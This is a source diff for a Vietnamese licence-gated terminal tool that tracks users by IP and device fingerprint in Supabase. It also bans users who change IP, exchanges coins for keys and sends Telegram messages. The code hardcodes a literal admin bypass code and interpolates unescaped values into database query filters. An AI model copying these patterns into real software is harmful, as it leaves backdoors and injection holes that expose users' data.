+#     updated_at timestamptz default now(),
+#     last_seen_at timestamptz default now()
+#   );
+#   create index if not exists users_ip_idx on public.users (ip);
+#
+# Nếu bảng cũ đã tạo, chạy thêm:
+#   alter table public.users add column if not exists keys jsonb default '[]'::jsonb;
+#   alter table public.users add column if not exists daily_claim_date text default '';
+#   alter table public.users add column if not exists coin_day text default '';
+#   alter table public.users add column if not exists mining boolean default false;
+#   alter table public.users add column if not exists mining_start double precision default 0;
+#   alter table public.users add column if not exists ban_until timestamptz;
+#   alter table public.users add column if not exists ban_reason text default '';
+#   create index if not exists users_fingerprint_idx on public.users (fingerprint);
+#   alter table public.users add column if not exists banned_until timestamptz;
+#   alter table public.users add column if not exists ban_reason text default '';
+#   create index if not exists users_fingerprint_idx on public.users (fingerprint);
+
+# Cache RAM (không ghi file local)
+_USER_CACHE: Dict[str, dict] = {}
+_USER_CACHE_TS: float = 0.0
+_USER_CACHE_TTL = 15.0  # giây
+DEVICE_BAN_DAYS = 2
+DEVICE_BAN_HOURS = 48  # 2 ngày — đổi IP trên cùng mã thiết bị
+
+
+def supabase_get_user(user_id: str) -> Optional[dict]:
+    """Lấy 1 user từ Supabase theo user_id."""
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{user_id}&select=*&limit=1"
+        r = requests.get(url, headers=supabase_headers(), timeout=12)
+        if r.status_code == 200:
+            rows = r.json() if isinstance(r.json(), list) else []
+            return rows[0] if rows else None
+        return None
+    except Exception:
+        return None
+
+
+def supabase_find_user_by_ip(ip: str) -> Optional[dict]:
+    """Tìm user trên Supabase theo IP (mỗi IP ideally 1 user)."""
+    if not ip or ip == "unknown":
+        return None
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/users?ip=eq.{ip}&select=*&limit=1"
+        r = requests.get(url, headers=supabase_headers(), timeout=12)
+        if r.status_code == 200:
+            rows = r.json() if isinstance(r.json(), list) else []
+            return rows[0] if rows else None
+        return None
+    except Exception:
+        return None
+
+
+def supabase_find_user_by_fingerprint(fp: str) -> Optional[dict]:
+    """Tìm user theo mã thiết bị (fingerprint)."""
+    if not fp:
+        return None
+    try:
+        # encode an toàn cho query
+        from urllib.parse import quote
+        q = quote(str(fp), safe="")
+        url = f"{SUPABASE_URL}/rest/v1/users?fingerprint=eq.{q}&select=*&limit=1"
+        r = requests.get(url, headers=supabase_headers(), timeout=12)
+        if r.status_code == 200:
+            rows = r.json() if isinstance(r.json(), list) else []
+            return rows[0] if rows else None
+        return None
+    except Exception:
+        return None
+
+
+def supabase_ban_user(user_id: str, hours: int = DEVICE_BAN_HOURS, reason: str = "") -> tuple:
+    """Ban user trên Supabase trong `hours` giờ."""
+    uid = str(user_id).strip()
+    if not uid:
+        return False, "user_id trống"
+    until = datetime.now(timezone.utc) + timedelta(hours=hours)
+    payload = {
+        "status": "banned",
+        "ban_until": until.isoformat(),
+        "ban_reason": reason or "Đổi IP / gian lận thiết bị",
+        "updated_at": datetime.now(timezone.utc).isoformat(),
+    }
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{uid}"
+        r = requests.patch(
+            url,
+            headers=supabase_headers(prefer="return=representation"),
+            json=payload,
+            timeout=15,
+        )
+        if r.status_code in (200, 204):
+            return True, until.isoformat()
+        return False, f"Ban fail {r.status_code}: {r.text[:200]}"
+    except Exception as e:
+        return False, str(e)
+
+
+def supabase_clear_ban_if_expired(user_id: str, row: Optional[dict] = None) -> bool:
+    """Hết hạn ban → status active. True nếu đã clear hoặc không còn ban."""
+    uid = str(user_id)
+    row = row or supabase_get_user(uid)
+    if not row:
+        return True
+    if str(row.get("status") or "") != "banned":
+        return True
+    ban_until = row.get("ban_until") or ""
+    if not ban_until:
+        return False
+    try:
+        dt = parse_datetime_safe(str(ban_until))
+        if dt is None:
+            return False
+        if datetime.now(timezone.utc) >= dt:
+            url = f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{uid}"
+            requests.patch(
+                url,
+                headers=supabase_headers(prefer="return=minimal"),
+                json={
+                    "status": "active",
+                    "ban_until": None,
+                    "ban_reason": "",
+                    "updated_at": datetime.now(timezone.utc).isoformat(),
+                },
+                timeout=12,
+            )
+            return True
+        return False
+    except Exception:
+        return False
+
+
+def show_ban_screen(user_id: str = "", reason: str = "", ban_until: str = "") -> None:  # noqa: E501
+    """Màn hình ban — hiện mỗi lần mở tool."""
+    console.print()
+    ban_info = Text()
+    ban_info.append("✕  SECURITY LOCK\n\n", style=f"bold {TST_COLORS['ruby']}")
+    ban_info.append("◈ USER       ", style=TST_COLORS["muted"])
+    ban_info.append(f"{user_id or '?'}\n", style=f"bold {TST_COLORS['platinum']}")
+    ban_info.append("◈ LÝ DO      ", style=TST_COLORS["muted"])
+    ban_info.append(f"{reason or 'Đổi IP trên cùng thiết bị'}\n", style=f"bold {TST_COLORS['neon_orange']}")
+    ban_info.append("◈ HẾT HẠN   ", style=TST_COLORS["muted"])
+    ban_info.append(f"{str(ban_until)[:19] or 'sau 2 ngày'}\n\n", style=f"bold {TST_COLORS['gold']}")
+    ban_info.append("Tool bị khóa. Liên hệ admin để gỡ ban.\n", style=TST_COLORS["platinum"])
+    ban_info.append("Chạy lại tool vẫn sẽ hiện thông báo này đến hết hạn.", style=TST_COLORS["muted"])
+    console.print(Panel(
+        Align.center(ban_info),
+        border_style=TST_COLORS["ruby"],
+        box=box.HEAVY_HEAD,
+        title=f"[bold {TST_COLORS['ruby']}]  ✕  ACCESS DENIED  [/]",
+        padding=(1, 2),
+    ))
+
+
+def supabase_unban_user(user_id: str) -> tuple:
+    """Admin gỡ ban user trên Supabase."""
+    uid = str(user_id).strip()
+    if not uid:
+        return False, "user_id trống"
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{uid}"
+        r = requests.patch(
+            url,
+            headers=supabase_headers(prefer="return=representation"),
+            json={
+                "status": "active",
+                "ban_until": None,
+                "ban_reason": "",
+                "updated_at": datetime.now(timezone.utc).isoformat(),
+            },
+            timeout=15,
+        )
+        if r.status_code in (200, 204):
+            return True, f"Đã gỡ ban user {uid}"
+        return False, f"Unban fail {r.status_code}: {r.text[:200]}"
+    except Exception as e:
+        return False, str(e)
+
+
+def check_device_ip_integrity() -> tuple:
+    """
+    ĐÃ TẮT kiểm tra 'cùng máy' (fingerprint).
+    Chỉ còn rule: mỗi IP 1 user trên Supabase (xem create_user / check_ip).
+    Vẫn chặn nếu user đang bị ban (status=banned) theo user_id gắn IP hiện tại.
+    """
+    ip = _current_client_ip()
+    try:
+        has_user, uid, row, _msg = check_ip_user_on_supabase(ip)
+    except Exception:
+        return True, "skip", None
+    if not has_user or not uid or not row:
+        return True, "OK", None
+    if str(row.get("status") or "") == "banned":
+        if not supabase_clear_ban_if_expired(uid, row):
+            show_ban_screen(uid, str(row.get("ban_reason") or ""), str(row.get("ban_until") or ""))
+            return False, "BỊ BAN RỒI GIAN LẬN KHÔNG ĐƯỢC NỮA ĐÂU", uid
+    return True, "OK", uid
+
+
+def _row_to_user_data(row: dict) -> dict:
+    """Map 1 row Supabase → dict user nội bộ."""
+    if not row:
+        return {}
+    keys = row.get("keys") or []
+    if isinstance(keys, str):
+        try:
+            keys = json.loads(keys)
+        except Exception:
+            keys = []
+    if not isinstance(keys, list):
+        keys = []
+    return {
+        "coins": float(row.get("coins", 0) or 0),
+        "mining": bool(row.get("mining", False)),
+        "mining_start": float(row.get("mining_start", 0) or 0),
+        "keys": keys,
+        "total_mined": float(row.get("total_mined", 0) or 0),
+        "daily_claim_date": str(row.get("daily_claim_date") or ""),
+        "coin_day": str(row.get("coin_day") or ""),
+        "created_at": str(row.get("created_at") or ""),
+        "ip": str(row.get("ip") or "unknown"),
+        "note": str(row.get("note") or ""),
+        "fingerprint": str(row.get("fingerprint") or ""),
+        "status": str(row.get("status") or "active"),
+        "ban_until": str(row.get("ban_until") or ""),
+        "ban_reason": str(row.get("ban_reason") or ""),
+        "checksum": "",
+    }
+
+
+def supabase_upsert_user(
+    user_id: str,
+    ip: str = "",
+    coins: float = 0,
+    total_mined: float = 0,
+    keys_count: int = 0,
+    note: str = "",
+    fingerprint: str = "",
+    status: str = "active",
+    keys: Optional[list] = None,
+    daily_claim_date: str = "",
+    coin_day: str = "",
+    mining: bool = False,
+    mining_start: float = 0,
+) -> tuple:
+    """
+    Lưu / cập nhật user lên Supabase (bảng users) — nguồn chính, không local.
+    Trả về (ok: bool, message_or_row).
+    """
+    uid = str(user_id).strip()
+    if not uid:
+        return False, "user_id trống"
+
+    now_iso = datetime.now(timezone.utc).isoformat()
+    keys_list = keys if isinstance(keys, list) else []
+    payload = {
+        "user_id": uid,
+        "ip": ip or "unknown",
+        "coins": float(coins or 0),
+        "total_mined": float(total_mined or 0),
+        "keys_count": int(keys_count if keys_count is not None else len(keys_list)),
+        "keys": keys_list,
+        "daily_claim_date": daily_claim_date or "",
+        "coin_day": coin_day or "",
+        "mining": bool(mining),
+        "mining_start": float(mining_start or 0),
+        "note": note or "",
+        "fingerprint": fingerprint or "",
+        "status": status or "active",
+        "updated_at": now_iso,
+        "last_seen_at": now_iso,
+    }
+
+    url = f"{SUPABASE_URL}/rest/v1/users"
+    headers = supabase_headers(prefer="resolution=merge-duplicates,return=representation")
+    headers["Prefer"] = "resolution=merge-duplicates,return=representation"
+    # PostgREST upsert
+    try:
+        # Thử PATCH nếu đã tồn tại
+        existing = supabase_get_user(uid)
+        if existing:
+            patch_url = f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{uid}"
+            # không ghi đè created_at
+            patch_body = {k: v for k, v in payload.items() if k != "user_id"}
+            r = requests.patch(
+                patch_url,
+                headers=supabase_headers(prefer="return=representation"),
+                json=patch_body,
+                timeout=15,
+            )
+            if r.status_code in (200, 204):
+                row = r.json()[0] if r.text and r.status_code == 200 and isinstance(r.json(), list) and r.json() else payload
+                return True, row
+            # fallback POST
+        else:
+            payload["created_at"] = now_iso
+
+        r = requests.post(
+            url,
+            headers=headers,
+            json=payload,
+            timeout=15,
+        )
+        if r.status_code in (200, 201):
+            data = r.json()
+            row = data[0] if isinstance(data, list) and data else data
+            return True, row
+        if r.status_code == 409:
+            # conflict → patch
+            patch_url = f"{SUPABASE_URL}/rest/v1/users?user_id=eq.{uid}"
+            r2 = requests.patch(
+                patch_url,
+                headers=supabase_headers(prefer="return=representation"),
+                json={k: v for k, v in payload.items() if k != "user_id"},
+                timeout=15,
+            )
+            if r2.status_code in (200, 204):
+                return True, payload
+            return False, f"Conflict + patch fail: {r2.status_code} {r2.text[:200]}"
+
+        return False, f"Supabase users lỗi {r.status_code}: {r.text[:300]}"
+    except Exception as e:
+        return False, f"Lỗi kết nối Supabase users: {e}"
+
+
+def supabase_list_users(limit: int = 50) -> list:
+    """Danh sách user trên Supabase."""
+    try:
+        url = f"{SUPABASE_URL}/rest/v1/users?select=*&order=updated_at.desc&limit={limit}"
+        r = requests.get(url, headers=supabase_headers(), timeout=15)
+        if r.status_code == 200:
+            return r.json() if isinstance(r.json(), list) else []
+        url2 = f"{SUPABASE_URL}/rest/v1/users?select=*&limit={limit}"
+        r2 = requests.get(url2, headers=supabase_headers(), timeout=15)
+        if r2.status_code == 200:
+            return r2.json() if isinstance(r2.json(), list) else []
+        return []
+    except Exception as e:
+        safe_console_print(f"[red]Lỗi list users: {e}[/red]")
+        return []
+
+
+def sync_user_to_supabase(user_id: str, user_data: Optional[dict] = None) -> tuple:
+    """Ghi user lên Supabase (nguồn chính)."""
+    uid = str(user_id)
+    if user_data is None:
+        data = load_user_data_secure()
+        user_data = data.get(uid) or {}
+    ip = str(user_data.get("ip") or get_public_ip() or _ip_info.get("public_ip") or "unknown")
+    keys = user_data.get("keys") or []
+    if not isinstance(keys, list):
+        keys = []
+    fp = str(user_data.get("fingerprint") or "")
+    if not fp:
+        try:
+            fp = get_device_fingerprint()
+        except Exception:
+            pass
+    ok, result = supabase_upsert_user(
+        user_id=uid,
+        ip=ip,
+        coins=float(user_data.get("coins", 0) or 0),
+        total_mined=float(user_data.get("total_mined", 0) or 0),
+        keys_count=len(keys),
+        keys=keys,
+        daily_claim_date=str(user_data.get("daily_claim_date") or ""),
+        coin_day=str(user_data.get("coin_day") or ""),
+        mining=bool(user_data.get("mining", False)),
+        mining_start=float(user_data.get("mining_start", 0) or 0),
+        note=str(user_data.get("note") or ""),
+        fingerprint=fp,
+        status=str(user_data.get("status") or "active"),
+    )
+    if ok:
+        global _USER_CACHE, _USER_CACHE_TS
+        _USER_CACHE[uid] = dict(user_data)
+        _USER_CACHE_TS = time.time()
+    return ok, result
+
+
+def parse_datetime_safe(date_str):
+    if not date_str or date_str == 'forever':
+        return None
+    try:
+        if 'Z' in date_str or '+' in date_str:
+            dt = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
+            return dt.astimezone(timezone.utc)
+        else:
+            dt = datetime.strptime(date_str, "%Y-%m-%d %H:%M:%S")
+            return dt.replace(tzinfo=timezone.utc)
+    except ValueError:
+        try:
+            dt = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S.%f")
+            return dt.replace(tzinfo=timezone.utc)
+        except ValueError:
+            return None
+
+# ================== HEARTBEAT ==================
+
+def heartbeat_worker():
+    global _is_authenticated, _user_key, _heartbeat_running
+    
+    while _heartbeat_running:
+        time.sleep(30)
+        
+        if _user_key and _is_authenticated:
+            result = verify_key_with_device(_user_key)
+            if not result.get("valid"):
+                _is_authenticated = False
+                safe_console_print("[bold red]🔒 KEY ĐÃ BỊ KHÓA HOẶC HẾT HẠN![/bold red]")
+                safe_console_print("[bold red]Tool sẽ tự động thoát sau 5 giây...[/bold red]")
+                time.sleep(5)
+                os._exit(0)
+
+def start_heartbeat():
+    global _heartbeat_thread, _heartbeat_running
+    _heartbeat_running = True
+    _heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
+    _heartbeat_thread.start()
+
+def stop_heartbeat():
+    global _heartbeat_running
+    _heartbeat_running = False
+
+# ================== MÀN HÌNH XÁC THỰC ==================
+
+def show_auth_choice_menu():
+    while True:
+        console.clear()
+        # Logo header
+        print_tst_logo()
+        console.print()
+
+        # Access tier cards
+        tiers = Table.grid(expand=True, padding=(0, 1))
+        tiers.add_column(ratio=1); tiers.add_column(ratio=1); tiers.add_column(ratio=1)
+
+        free_body = Text()
+        free_body.append("★ FREE\n", style=f"bold {TST_COLORS['gold']}")
+        free_body.append("10 AI engines\nVTH + CDTD\nLotto 5 AI", style=TST_COLORS["muted"])
+
+        vip_body = Text()
+        vip_body.append("♛ VIP\n", style=f"bold {TST_COLORS['neon_pink']}")
+        vip_body.append("42 AI engines\nAll modules\nPriority access", style=TST_COLORS["platinum"])
+
+        admin_body = Text()
+        admin_body.append("◈ ADMIN\n", style=f"bold {TST_COLORS['ruby']}")
+        admin_body.append("Enter secret code\nFull system access\nUser management", style=TST_COLORS["muted"])
+
+        tiers.add_row(
+            Panel(Align.center(free_body),  border_style=TST_COLORS["gold"],     box=box.HEAVY_HEAD, padding=(1,2)),
+            Panel(Align.center(vip_body),   border_style=TST_COLORS["neon_pink"],box=box.HEAVY_HEAD, padding=(1,2)),
+            Panel(Align.center(admin_body), border_style=TST_COLORS["ruby"],     box=box.HEAVY_HEAD, padding=(1,2)),
+        )
+        console.print(Panel(
+            tiers,
+            title=f"[bold {TST_COLORS['sapphire']}]  ♛  ACCESS GATE  —  TST-TOOL  [/]",
+            border_style=TST_COLORS["sapphire"],
+            box=box.HEAVY_HEAD,
+            padding=(0, 1),
+        ))
+        raw = _ui_prompt("KEY / ADMIN CODE").strip()
+        if raw == ADMIN_SECRET_CODE or raw == "9826665":
+            try: admin_menu()
+            except NameError: console.print("[red]Admin menu chưa sẵn sàng.[/red]")
+            continue
+        return show_auth_screen()
+
+
+def coin_exchange_before_auth() -> None:
+    """Menu đổi key bằng xu: tạo user, nhận xu, đổi key."""
+    while True:
+        console.clear()
+        console.print(Panel(
+            Align.center("🎁 ĐỔI KEY BẰNG XU 🎁"),
+            border_style=TST_COLORS["gold"],
+            box=box.ROUNDED
+        ))
+        console.print()
+        console.print("[1] 👤 Tạo user mới")
+        console.print("[2] 🎁 Nhận xu / Đổi KEY FREE 13 GIỜ")
+        console.print("[q] 🔙 Quay lại")
+        console.print()
+
+        sub = Prompt.ask(
+            f"[bold {TST_COLORS['gold']}]>> Chọn[/bold {TST_COLORS['gold']}]",
+            choices=["1", "2", "q"],
+            default="2"
+        )
+
+        if sub == "q":
+            return
+
+        if sub == "1":
+            prompt_create_user()
+            input("\n[dim]Nhấn Enter để tiếp tục...[/dim]")
+            continue
+
+        # sub == "2": dùng xu / đổi key
+        # Gợi ý user đúng theo IP để giảm nhập bừa
+        ip_now = _current_client_ip()
+        bound = find_user_by_ip(ip_now)
+        if bound:
+            console.print(f"[dim]IP {ip_now} đã gắn user [bold]{bound}[/bold] — nên dùng đúng ID này.[/dim]")
+
+        user_id_text = Prompt.ask(
+            "[bold cyan]Nhập ID tài khoản để dùng xu[/bold cyan]",
+            default=str(bound) if bound else ""
+        )
+        if not user_id_text.isdigit():
+            console.print("[red]❌ ID tài khoản không hợp lệ![/red]")
+            time.sleep(1.5)
+            continue
+
+        user_id = int(user_id_text)
+
+        # Nếu user chưa tồn tại → hỏi tạo luôn (vẫn check IP 1 user)
+        data = load_user_data_secure()
+        if str(user_id) not in data:
+            console.print(f"[yellow]⚠️ User {user_id} chưa tồn tại.[/yellow]")
+            create_now = Prompt.ask(
+                "[bold cyan]Tạo user này ngay? (y/n)[/bold cyan]",
+                choices=["y", "n"],
+                default="y"
+            )
+            if create_now == "y":
+                ok, msg = create_user_secure(user_id)
+                console.print(f"[green]✅ {msg}[/green]" if ok else f"[red]❌ {msg}[/red]")
+                if not ok:
+                    time.sleep(1.5)
+                    continue
+            else:
+                time.sleep(1)
+                continue
+        else:
+            # Chống nhập bừa ID người khác — có key thì thu hồi ngay
+            ok_access, access_msg = verify_user_id_access(user_id)
+            if not ok_access:
+                console.print(Panel(
+                    Text(access_msg, style="bold red"),
+                    title="[bold red]CHỐNG NHẬP BỪA ID[/bold red]",
+                    border_style=TST_COLORS["ruby"],
+                    box=box.ROUNDED,
+                ))
+                time.sleep(2.5)
+                continue
+
+        success, msg = claim_daily_coins_secure(user_id)
+        console.print(
+            f"[green]✅ {msg}[/green]" if success else f"[yellow]ℹ️ {msg}[/yellow]"
+        )
+
+        balance = get_user_balance_secure(user_id)
+        console.print(f"\n[bold green]💰 Số dư: {balance.get('coins', 0):.2f} xu[/bold green]")
+        console.print("[dim]🔑 5 xu = KEY FREE 13 GIỜ[/dim]\n")
+
+        if balance.get("coins", 0) >= FREE_KEY_PRICE:
+            confirm = Prompt.ask(
+                "[bold cyan]Đổi 5 xu lấy KEY FREE 13 GIỜ? (y/n)[/bold cyan]",
+                choices=["y", "n"],
+                default="y"
+            )
+            if confirm == "y":
+                with console.status("[bold yellow]⏳ Đang tạo key trên Supabase...[/bold yellow]", spinner="dots"):
+                    ok, result = exchange_free_key_13h_secure(user_id)
+                if ok:
+                    console.print(Panel(
+                        Text.assemble(
+                            ("✅ ĐỔI KEY THÀNH CÔNG!\n\n", "bold green"),
+                            ("KEY: ", "bold white"), (f"{result}\n", f"bold {TST_COLORS['gold']}"),
+                            ("Loại: FREE\n", "bold cyan"),
+                            ("Thời hạn: 13 GIỜ\n", "bold green"),
+                            ("🌐 Supabase: ", "white"), ("Đã tạo & kích hoạt\n", "bold green"),
+                            ("💡 Dùng key này ở menu NHẬP KEY để đăng nhập.", "dim"),
+                        ),
+                        border_style=TST_COLORS["emerald"],
+                        box=box.ROUNDED
+                    ))
+                else:
+                    console.print(f"[red]❌ {result}[/red]")
+        else:
+            console.print("[yellow]⚠️ Chưa đủ 5 xu để đổi key.[/yellow]")
+
+        input("\n[dim]Nhấn Enter để quay lại...[/dim]")
+
+
+def show_auth_screen():
+    global _key_type, _secure_mode
+    
+    if not anti_crack_check():
+        return False, None, "free"
+    
+    if not enhanced_auth_check():
+        console.print("[red]❌ Xác thực IP thất bại![/red]")
+        time.sleep(2)
+        return False, None, "free"
+    
+    console.clear()
+    gold_color = TST_COLORS["gold"]
+    print_tst_logo()
+    console.print()
+    console.print(Rule(f"[bold {TST_COLORS['gold']}]  ♛  XÁC THỰC KEY  [/]", style=TST_COLORS["sapphire"]))
+    console.print()
+    
+    # Access tier display
+    access_grid = Table.grid(expand=True, padding=(0, 2))
+    access_grid.add_column(ratio=1); access_grid.add_column(ratio=1)
+
+    free_info = Text()
+    free_info.append("★ FREE KEY\n", style=f"bold {TST_COLORS['gold']}")
+    free_info.append("· 10 AI engines\n", style=TST_COLORS["muted"])
+    free_info.append("· VTH + CDTD\n", style=TST_COLORS["muted"])
+    free_info.append("· Lotto 5 AI", style=TST_COLORS["muted"])
+
+    vip_info = Text()
+    vip_info.append("♛ VIP KEY\n", style=f"bold {TST_COLORS['neon_pink']}")
+    vip_info.append("· 42 AI engines\n", style=TST_COLORS["platinum"])
+    vip_info.append("· All modules unlocked\n", style=TST_COLORS["platinum"])
+    vip_info.append("· Priority + Lotto full", style=TST_COLORS["platinum"])
+
+    access_grid.add_row(
+        Panel(free_info,  border_style=TST_COLORS["gold"],     box=box.SIMPLE, padding=(0,1)),
+        Panel(vip_info,   border_style=TST_COLORS["neon_pink"],box=box.SIMPLE, padding=(0,1)),
+    )
+
+    sec_body = Text()
+    sec_body.append("◈ Anti-Crack   ", style=f"bold {TST_COLORS['emerald']}")
+    sec_body.append("ACTIVE  ", style=TST_COLORS["muted"])
+    sec_body.append("⬡ IP Guard   ", style=f"bold {TST_COLORS['turquoise']}")
+    sec_body.append("ACTIVE  ", style=TST_COLORS["muted"])
+    sec_body.append("⬡ Anti-Detection   ", style=f"bold {TST_COLORS['sapphire']}")
+    sec_body.append("ACTIVE", style=TST_COLORS["muted"])
+
+    console.print(Panel(
+        Group(access_grid, Rule(style=TST_COLORS["accent_line"]), Align.center(sec_body)),
+        title=f"[bold {TST_COLORS['sapphire']}]  ◉  ACCESS OVERVIEW  [/]",
+        border_style=TST_COLORS["sapphire"],
+        box=box.HEAVY_HEAD,
+        padding=(0, 1),
+    ))
+    console.print()
+
+    opt_table = Table.grid(expand=True, padding=(0, 2))
+    opt_table.add_column(ratio=1); opt_table.add_column(ratio=1)
+    opt_table.add_row(
+        Panel(Text.assemble(("◈ 1  ", f"bold {TST_COLORS['gold']}"), ("Nhập Key xác thực", TST_COLORS["platinum"])),
+              border_style=TST_COLORS["gold"], box=box.SIMPLE, padding=(0,1)),
+        Panel(Text.assemble(("◉ 2  ", f"bold {TST_COLORS['sapphire']}"), ("Tạo User mới (xu/key)", TST_COLORS["platinum"])),
+              border_style=TST_COLORS["sapphire"], box=box.SIMPLE, padding=(0,1)),
+    )
+    console.print(opt_table)
+    auth_sub = Prompt.ask(
+        f"[bold {TST_COLORS['gold']}] ♛  CHỌN[/bold {TST_COLORS['gold']}]"
+        f"[{TST_COLORS['accent_line']}] ─────────────── [/{TST_COLORS['accent_line']}]"
+        f"[bold {TST_COLORS['emerald']}]▶[/bold {TST_COLORS['emerald']}]",
+        choices=["1", "2"],
+        default="1"
+    )
+    if auth_sub == "2":
+        prompt_create_user()
+        input("\n[dim]Nhấn Enter để quay lại nhập key...[/dim]")
+        console.clear()
+        for i, line in enumerate(logo_lines):
+            if line.strip():
+                col = TST_COLORS["sapphire"] if i % 2 == 0 else TST_COLORS["gold"]
+                console.print(Align.center(Text(line, style=f"bold {col}")))
+        console.print(Align.center(Text(LOGO_TAGLINE, style=TST_COLORS["muted"])))
+        console.print()
+        console.print(Rule(f"[bold {TST_COLORS['gold']}]  ♛  XÁC THỰC KEY  [/]", style=TST_COLORS["sapphire"]))
+        console.print()
+    
+    console.print(Panel(
+        Text.assemble(
+            ("◈ KEY FORMAT  ", f"bold {TST_COLORS['muted']}"),
+            ("TST-TOOL_XXXXX", f"bold {TST_COLORS['gold']}"),
+            ("  hoặc  ", TST_COLORS["muted"]),
+            ("FREE_XXXXX", f"bold {TST_COLORS['sapphire']}"),
+        ),
+        border_style=TST_COLORS["accent_line"],
+        box=box.SIMPLE,
+        padding=(0, 1),
+    ))
+    key = Prompt.ask(
+        f"[bold {TST_COLORS['gold']}] ♛  NHẬP KEY[/bold {TST_COLORS['gold']}]"
+        f"[{TST_COLORS['accent_line']}] ──────────── [/{TST_COLORS['accent_line']}]"
+        f"[bold {TST_COLORS['emerald']}]▶[/bold {TST_COLORS['emerald']}]",
+        default=""
+    )
+    
+    if not key:
+        console.print("[red]❌ Key không được để trống![/red]")
+        time.sleep(1.5)
+        return False, None, "free"
+    
+    # Đã bỏ xoay IP / chống soi
+    global _secure_mode, _secure_tool
+    _secure_mode = False
+    _secure_tool = None
+
+    with console.status(f"[bold yellow]⏳ Đang xác thực...[/bold yellow]", spinner="dots") as status:
+        time.sleep(0.5)
+        result = verify_key_with_device(key)
+    
+    if result.get("valid"):
+        console.print()
+        data = result.get("data", {})
+        key_type = data.get("key_type", "free")
+        max_ai = data.get("max_ai", 10)
+        
+        expiry_info = ""
+        expires_at = data.get('expires_at')
+        if expires_at and expires_at != 'forever':
+            try:
+                expiry_dt = parse_datetime_safe(expires_at)
+                if expiry_dt:
+                    now_utc = datetime.now(timezone.utc)
+                    time_left = expiry_dt - now_utc
+                    days = time_left.days
+                    hours = time_left.seconds // 3600
+                    minutes = (time_left.seconds % 3600) // 60
+                    if days > 0:
+                        expiry_info = f"Còn {days} ngày {hours} giờ"
+                    elif hours > 0:
+                        expiry_info = f"Còn {hours} giờ {minutes} phút"
+                    else:
+                        expiry_info = f"Còn {minutes} phút"
+            except:
+                expiry_info = expires_at
+        
+        key_icon = "👑" if key_type == "vip" else "🔑"
+        key_color = "bold gold" if key_type == "vip" else "bold white"
+        
+        # Auth success — premium dark card
+        auth_grid = Table.grid(expand=True, padding=(0, 2))
+        auth_grid.add_column(ratio=1); auth_grid.add_column(ratio=1)
+
+        left_info = Text()
+        left_info.append("◈ KEY\n", style=f"bold {TST_COLORS['muted']}")
+        left_info.append(f"{key}\n\n", style=f"bold {TST_COLORS['gold']}")
+        left_info.append("◈ LOẠI\n", style=f"bold {TST_COLORS['muted']}")
+        left_info.append(f"{key_icon} {key_type.upper()}\n\n", style=key_color)
+        left_info.append("◈ ENGINE AI\n", style=f"bold {TST_COLORS['muted']}")
+        left_info.append(f"{max_ai} / 42 AI", style=f"bold {TST_COLORS['neon_blue']}")
+
+        right_info = Text()
+        right_info.append("◈ TRẠNG THÁI\n", style=f"bold {TST_COLORS['muted']}")
+        right_info.append("● ACTIVE\n\n", style=f"bold {TST_COLORS['emerald']}")
+        right_info.append("◈ HẠN SỬ DỤNG\n", style=f"bold {TST_COLORS['muted']}")
+        right_info.append(f"{expiry_info}\n\n", style=f"bold {TST_COLORS['gold']}")
+
+        auth_grid.add_row(
+            Panel(left_info,  border_style=TST_COLORS["accent_line"], box=box.SIMPLE, padding=(0,1)),
+            Panel(right_info, border_style=TST_COLORS["accent_line"], box=box.SIMPLE, padding=(0,1)),
+        )
+
+        sec_strip = Text()
+        sec_strip.append("◈ Anti-Crack  ACTIVE  ", style=f"bold {TST_COLORS['emerald']}")
+        sec_strip.append(f"· IP: {_ip_info.get('public_ip', 'N/A')}  ", style=TST_COLORS["muted"])
+        sec_strip.append(f"· Used: {data.get('used_count',0)}/{data.get('max_uses','∞')}", style=TST_COLORS["muted"])
+
+        console.print(Panel(
+            Group(auth_grid, Rule(style=TST_COLORS["accent_line"]), Align.center(sec_strip)),
+            title=f"[bold {TST_COLORS['emerald']}]  ✓  XÁC THỰC THÀNH CÔNG  [/]",
+            border_style=TST_COLORS["emerald"],
+            box=box.HEAVY_HEAD,
+            padding=(0, 1),
+        ))
+        
+        console.print()
+        console.print("[dim]Nhấn Enter để tiếp tục...[/dim]")
+        input()
+        
+        return True, key, key_type
+    else:
+        console.print()
+        console.print(Panel(
+            Text.assemble(
+                ("✕  XÁC THỰC THẤT BẠI\n\n", f"bold {TST_COLORS['ruby']}"),
+                ("◈ Lỗi   ", f"bold {TST_COLORS['muted']}"),
+                (f"{result.get('error', 'Không xác định')}\n\n", f"bold {TST_COLORS['ruby']}"),
+                ("Vui lòng kiểm tra lại Key và thử lại.", TST_COLORS["muted"]),
+            ),
+            title=f"[bold {TST_COLORS['ruby']}]  ✕  THẤT BẠI  [/]",
+            border_style=TST_COLORS["ruby"],
+            box=box.HEAVY_HEAD,
+            padding=(1, 2),
+        ))
+        console.print()
+        console.print("[dim]Nhấn Enter để thử lại...[/dim]")
+        input()
+        return False, None, "free"
+
+def require_valid_auth() -> bool:
+    global _is_authenticated
+    return _is_authenticated
+
+def safe_console_print(*args, **kwargs):
+    try:
+        console.print(*args, **kwargs)
+    except:
+        pass
+
+def safe_console_status(message, spinner="dots"):
+    return console.status(message, spinner=spinner)
+
+# ================== TELEGRAM ==================
+
+def send_telegram_message(message: str) -> bool:
+    if not TELEGRAM_ENABLED or not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        return False
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True}
+        
+        if _secure_tool and _secure_tool.is_stealth:
+            response = _secure_tool.make_secure_request(url, method='POST', json=payload, timeout=10)
+            return response.status_code == 200 if response else False
+        else:
+            response = requests.post(url, json=payload, timeout=10)
+            return response.status_code == 200
+    except:
+        return False
+
+def setup_telegram():
+    global TELEGRAM_CHAT_ID, TELEGRAM_ENABLED
+    console.clear()
